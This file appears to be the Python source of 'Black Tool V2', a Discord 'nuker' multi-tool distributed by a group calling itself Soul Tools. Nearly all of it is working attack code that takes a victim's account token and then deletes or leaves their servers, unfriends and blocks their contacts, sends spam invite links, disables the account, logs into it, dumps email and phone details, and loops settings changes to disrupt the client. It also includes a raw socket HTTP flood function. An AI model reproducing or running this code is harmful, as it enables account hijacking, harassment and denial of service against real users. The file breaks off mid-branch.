#Coded / Dev: .exe#9805 & 🎃 | Benito Mussolini | 🎃#7220, Join Soul Tools:https://discord.gg/dmtQtBTcfU
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import disnake, os
from io import BytesIO
from disnake.ext import commands
import aiohttp
from disnake.utils import get
from disnake import WebhookMessage, WebhookType
import time
import sys, re
import httpx
import colored
import os.path
import requests, os, threading, disnake, time
from colorama import Fore
from colored import fg, attr
from disnake.ext import commands
from pypresence import Presence
import colorama
import requests
import colorama 
import os
from os import system
import time
import randstr
import threading
import requests
import json
import string
import random
import time
import sys
import colorama
from colorama import Style, Fore
from time import sleep
from multiprocessing import current_process
from colored import fg
from pystyle import *
from tkinter import *
from tkinter.filedialog import *
from colorama import Fore, Back, Style
from threading import Thread
import requests
import webbrowser
import time
from pystyle import *
from time import sleep
from requests.api import options
from colorama import Fore, Back, Style, init
from colorama import Fore, Style, Back
import string
from disnake import Permissions
import subprocess
import webbrowser
import sys
import colorama
import asyncio
from os import system
import asyncio
import codecs
import sys
import io
import random
import asyncio
import codecs
import sys
import io
from pystyle import Colors, Write
import threading
import requests
import os
import colorama
from disnake.ext import commands
from disnake.ext.commands import Bot
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from fade import *
from base64 import b64decode
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
from dhooks import Webhook
import socket
from disnake.ext import commands
from disnake.utils import get
from colorama import Fore, init
g = fg('#ff4b00')
os.system('cls')
colorama.init()
try:
        assert sys.version_info >= (3,8)
except AssertionError:
        print(f"{Fore.RED}Your Python Version is Not supported: ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}), Please Download the version 3.9+ to use Black Nuker V2!")
        time.sleep(5)
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}>{Fore.LIGHTMAGENTA_EX}]{Fore.GREEN}Exiting{Fore.YELLOW}...")
        time.sleep(1.5)
        os._exit(0)

colorama.init()
os.system('cls')
system('title Black Tool V2 - Starting...')
os.system('cls')
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get


try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import disnake
except:
    os.system("pip install disnake")
    import disnake

from disnake.ext import commands
from disnake import Permissions

try:
   import aiohttp
except:
  os.system("pip install aiohttp")

try:
   import asyncio
except:
  os.system("pip install asyncio")
try:
   import time
except:
  os.system("pip install time")
try:
   import datetime
except:
  os.system("pip install datetime")
try:
   import sys
except:
  os.system("pip install sys")
try:
   import os
   from os import system
except:
  os.system("pip install os")
# ====================================================================================================================== #

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

# ====================================================================================================================== #
def getheaders(token=None):
    headers = {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")
def leaveServer(token):
    headers = {'Authorization': token}
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
            print(f"[ {Fore.LIGHTCYAN_EX}C{Fore.RESET} ] {Fore.LIGHTCYAN_EX}Left Server: "+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
def createServers(token, count, name):
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(int(count)):
     try:
        print(f"{Fore.WHITE}[{Fore.LIGHTCYAN_EX}{str(i+1)}{Fore.WHITE}] Created Server")
        json = { 'name': name }
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=json)
     except:
        Write.Print(f"{Fore.WHITE}[{Fore.LIGHTCYAN_EX}!{Fore.WHITE}]Error")
def change(token, bio):
    global done, lest
    while True:

        re = requests.patch("https://discord.com/api/v9/users/@me/profile", headers={"authorization": token}, json={"bio": bio})
        if "200" in str(re):
            lest.append("Changed Bio")
            break
        if "429" in str(re):
            lest.append("Rate Limited")
        if "429" not in str(re) and "200" not in str(re):
            lest.append("Failed To Change Bio")
            break
    done = int(done) + 1
def leaveG(guild_id, token,):
   
      try:
         re = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Left {r}>> [ {g}{guild_id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Leave {r}>> [ {g}{guild_id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return

def createG(name, token, i,):
   
      try:
         payload = {'name': f'{name}', 'region': 'europe', 'icon': None, 'channels': None}
         re = requests.post('https://discord.com/api/v6/guilds', headers={"Authorization": token}, json=payload)
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Created {r}>> [ {g}{name} {r}] {g}Servers{r}")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Create{r}>> [ {g}{name} {i}{r} ]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return
def deleteG(guild,token,):
   
      try:
         re = requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Deleted {r}>> [ {g}{guild} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Delete {r}>> [ {g}{guild} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def closeD(id, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/channels/{id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Closed {r}>> [ {g}{id} {r}] DMS")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Close {r}>> [ {g}{id} {r}] DMS")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def deleteF(friend, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Removed {r}>> [ {g}{id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Remove{r}>> [ {g}{id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass
def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
def MassReport():
  global sent
  headers = {
        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
        'Authorization': token,
        'Content-Type': 'application/json'
      }

  payload = {
    'channel_id': channel_id1,
    'guild_id': guild_id1,
    'message_id': message_id1,
    'reason': reason1
  }

  while True:
    r = requests.post('https://discord.com/api/v9/report', headers=headers, json=payload)
    if r.status_code == 201:
      print(f"""
{Fore.GREEN}╔{Fore.GREEN}[>>>] Sent report, Report ID:{message_id1}
{Fore.GREEN}║{Fore.GREEN}Succesfully Sended the report! 
{Fore.GREEN}║{Fore.GREEN}Black Tool V2
{Fore.GREEN}╚{Fore.GREEN}Guild ID:{guild_id1}""")
      system(f'title Sending Reports. . .')
      
    elif r.status_code == 401:
      Write.Print(f"""
[-]Invalid token""", Colors.blue_to_red, interval=0.000)
      input()
      exit()
    else:
      Write.Print(f"""
╔[+]Error While Sending the report.
║Failed to send the report.
║Black Tool V2
╚Guild ID:{guild_id1}""", Colors.blue_to_red, interval=0.000)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
def menu():
    Write.Print(f"""
══════════════════════════════════════════════════════════════════════════════════════
[1]Server Lookup  
[2]Exit    
══════════════════════════════════════════════════════════════════════════════════════          
""", Colors.purple_to_blue, interval=0.000)
def main2():
 os.system('cls')
 system('title Black Tool V2 - Loading Spammer')
 Write.Print(f"[+]Starting Spammer...",Colors.blue_to_cyan, interval=0.000)
 time.sleep(2.5)
 os.system('cls')
 system('title Black Tool V2 - [5]Spammmer')
 Write.Print(f"""██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝ 
══════════════════════════════════════════════════════════════════════════════════════""", Colors.blue_to_purple, interval=0.000)
 Write.Print(f"""
[1]Joiner """, Colors.blue_to_purple, interval=0.000)
 Write.Print(f"""
[2]Leaver""", Colors.blue_to_purple, interval=0.000)  
 Write.Print(f"""
[3]Spammer 
[4]DM Spammer            
[5]HypeSquad/Joiner/Leaver
[6]Token Onliner
[7]NickName Changer
[8]PFP Changer
[9]GroupChat Spammer
[10]Friend Request Spammer
[11]Activity Changer
[12]VC Spammer
[13]EXIT
══════════════════════════════════════════════════════════════════════════════════════""", Colors.blue_to_purple, interval=0.000)    
def main():

 Write.Print(f"[+]Starting Spammer...", Colors.red_to_yellow, interval=0.000)
 time.sleep(2)
 os.system('cls')
 Write.Print(f"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝""", Colors.red_to_yellow, interval=0.000)
 Write.Print("""
 [1] Joiner """, Colors.red_to_yellow, interval=0.000)
 Write.Print("""
 [2] Soon...""", Colors.red_to_yellow, interval=0.000)
def mainanswer(): 
    answer = Write.Input('''
    Chose:''', Colors.red_to_yellow, interval=0.000)
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('Incorrect selection, please choose a number')
        mainanswer()
def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
def nuke():
    print("Loading...")
    print('\n')

    @bot.event
    async def on_ready(times: int = 100):

        print('STATUS : [NUKE]')
        print('\n')
        print('1 - LEAVING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'{Fore.GREEN}Left [{guild.name}]')
            except:
                print(f'{Fore.LIGHTRED_EX}CANT LEAVE {Fore.MAGENTA}[{Fore.YELLOW}{guild.name}{Fore.MAGENTA}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f'{Fore.LIGHTYELLOW_EX}CANT DELETE {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX}{guild.name}{Fore.LIGHTGREEN_EX}]')

        print('\n')
        print(f'{Fore.LIGHTGREEN_EX}3 {Fore.WHITE}- {Fore.LIGHTYELLOW_EX}REMOVING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.dm_channel.send('discord.gg/h2jVmGQtkQ')
                await user.remove_friend()
                print(f'{Fore.LIGHTGREEN_EX}Unfriended {user}')
            except:
                print(f"{Fore.LIGHTRED_EX}CAN'T UNFRIEND {user}")

        print('\n')
        print(f'{Fore.LIGHTGREEN_EX}4 {Fore.WHITE}- {Fore.LIGHTYELLOW_EX}SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('Nuked By Soul Tools', region=None, icon=None)
            print(f'{i} {Fore.LIGHTRED_EX}Server Spammed')
        print('\n')
        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}Max server limit is [100]')
        print('\n')
        print('\n')
        print(f'{Fore.LIGHTGREEN_EX}5 {Fore.WHITE}- {Fore.LIGHTYELLOW_EX}CRASHING DISCORD')
        print('\n')

        print('\n')
        print(f"{Fore.LIGHTGREEN_EX}CRASHING THE TOKEN OWNER'S DISCORD{Fore.LIGHTYELLOW_EX}...")
        print(
            f'{Fore.GREEN}IF YOU WANNA KEEP {Fore.WHITE}GIVING TOKEN OWNER A STROKE {Fore.RED}THEN KEEP THIS EXE RUNNING'
        )
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)

    bot.run(token, bot=False)

def unfriender():
    print("Loading...")

    @bot.event
    async def on_ready():
        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}STATUS : [UNFRIENDER]')

        for user in bot.user.friends:
            try:
                embed=disnake.Embed(title="Nuked By Soul tool: https://discord.gg/bAGFM9f4xg", description="Black Tool V2 Account Nuker <$", color=0x0000ff) 
                embed.set_author(name=".exe and benito Loves You Blitch") 
                embed.set_footer(text="Black Tool V2")
                embed.set_image(url="https://giphy.com/gifs/AhIw3Q2NaPEsvmfjbq") 
                await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}Unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print(
            f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)

def generate_random_string(Ammount):
    string_returned = "".join(
        random.choice(string.ascii_letters) for i in range(0, Ammount)
    )
    return string_returned





def get_token_information(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    token_info_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    for key in token_info_request:
        print(f"{Fore.WHITE}{key}: {Fore.RED}{token_info_request[f'{key}']}")
    time.sleep(3)


def spam_token_servers(Token):
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for count, i in enumerate(range(0, 25)):
        payload = {"name": generate_random_string(15)}
        spam_server_request = requests.post(
            "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
        )

    

def remove_token_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.get(
        "https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers
    )


def resend_verification_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)
    
#### server leaver
def leaver():
    print("Loading...")
    #bot.logout

    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}Lefted [{guild.name}]')
            except:
                print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}Cant leave [{guild.name}] but it will be deleted...')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}[{guild.name}] has been deleted')
            except:
                print(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}CAN'T DELETE [{guild.name}]")

        print('\n')
        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)


#### spam servers
def spamservers():
    print(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}Loading{Fore.GREEN}...")

    @bot.event
    async def on_ready(times: int = 95):
        print(f'{Fore.RED}STATUS : {Fore.GREEN}[SERVER SPAMMER]')

        for i in range(times):
            await bot.create_guild(
                'Fucked By Soul Tools', region=None, icon=None)
            print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.GREEN}{i} useless server created')

        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]max server limit is [100]')
        print('\n')
        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}][[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()

    bot.run(token, bot=False)


def tokenDisable(token):
    print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}STATUS : {Fore.YELLOW}[DISABLING TOKEN]')
    r = requests.patch(
        'https://discordapp.com/api/v6/users/@me',
        headers={'Authorization': token})
    if r.status_code == 400:
        print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.BLUE}Account disabled successfully')
        input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.MAGENTA}Press any key to exit...")
    else:
        print(f'{Fore.YELLOW}Invalid token')
        input(f"{Fore.BLACK}Press any key to exit{Fore.YELLOW}...")


def tokenLogin(token):
    token=Write.Input("[>>>]Token:", Colors.purple_to_blue, interval=0.000)
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')


def tokenInfo(token):
    print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.BLUE}STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        


def crashdiscord(token):
    print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]STATUS : [DISCORD CRASHER]')
    print('\n')
    print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.YELLOW}CRASHING THE TOKEN OWNER DISCORD...')
    print(f'{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}]{Fore.RED}IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)
Write.Print(f"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░  ██╗░░░██╗██████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░  ██║░░░██║╚════██╗
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░  ╚██╗░██╔╝░░███╔═╝
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░  ░╚████╔╝░██╔══╝░░
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗  ░░╚██╔╝░░███████╗
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝  ░░░╚═╝░░░╚══════╝""", Colors.yellow_to_red, interval=0.000)
Write.Print(f"""
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
[1]Server Nuker         [9]Dosser              [17]Bio Changer         [25]Cycle Token Status        [33]Ban Token
[2]Account Nuker        [10]Ip/Website Ping    [18]Get All Friends     [26]Token Mass DM             [34]Delete Guilds
[3]Nitro Gen            [11]TikTok Sharing Bot [19]Spam Token Servers  [27]Mark Servers Read         [35]Group Joiner
[4]Youtube Visual Bot   [12]Token Grabber      [20]Remove All Friends  [28]Remove Email              [36]Change Activity
[5]Black Spammer        [13]Server Info        [21]Block All Friends   [29]Token Delete Webhook      [37]Server Spam
[6]Webhook Tool         [14]Mass Report        [22]Spam Token Settings [30]Get Token Country         [38]CMD
[7]Ip lookup            [15]Token Checker      [23]Leave All Server    [31]Resend Verification Email [39]EXIT
[8]Ip Builder           [16]Token Info         [24]Close All DMs       [32]Spam Token Email
═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════""",  Colors.purple_to_blue, interval=0.000)
Write.Print(f"""
[!]Made by .exe#1567 and 🎃 | Benito Mussolini | 🎃#5257""", Colors.cyan_to_blue, interval=0.000)
Write.Print(f"""
[!]Soul Tools link:https://discord.gg/dmtQtBTcfU""", Colors.blue_to_cyan, interval=0.000)
Write.Print(f"""
[!]Multi tool | Black Tool V2""", Colors.blue_to_cyan, interval=0.000) 
time.sleep(0.2)
choice = Write.Input(f"""
[%]Choice:""", Colors.red_to_yellow, interval=0.000)

if choice == "18":
    Token = Write.Input("[>>>]Insert the token:", Colors.purple_to_blue, interval=0.000)
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
    time.sleep(3)
    os.startfile('Component.py')
    os._exit(0)
 
elif choice == "19":
        Token = input("[>]Enter A Token: ")
        headers = {"authorization": Token, "user-agent": "bruh6/9"}
        for count, i in enumerate(range(0, 25)):
         payload = {"name": generate_random_string(15)}
         spam_server_request = requests.post(
            "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
         )
        os.startfile('Component.py')
        os._exit(0)
elif choice == "20":
        Token = input("[>]Enter A Token: ")
        headers = {"authorization": Token, "user-agent": "bruh6/9"}
        remove_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
        for i in remove_friends_request:
         requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
         )
         print(f"Removed Friend {i['id']}")
        os.startfile('Component.py')
        os._exit(0)
elif choice == "21":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"Blocked Friend {i['id']}")
    os.startfile('Component.py')
    os._exit(0)
elif choice == "22":
 Token = input("[>]Enter A Token: ")
 print('Started Job')
 for i in range(0, 100):
  headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
  condition_status = True
  payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
  requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
  condition_status = False
  payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
  requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
 os.startfile('Component.py')
 os._exit(0)

elif choice == "23":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
        print(f"Left Guild: {guild['id']}")
    os.startfile('Component.py')
    os._exit(0)
elif choice == "24":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )
    os.startfile('Component.py')
    os._exit(0)
elif choice == "25":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(0, 50):
        json = {"custom_status": {"text": "black_tool_on_top", "emoji_name": "🍉"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
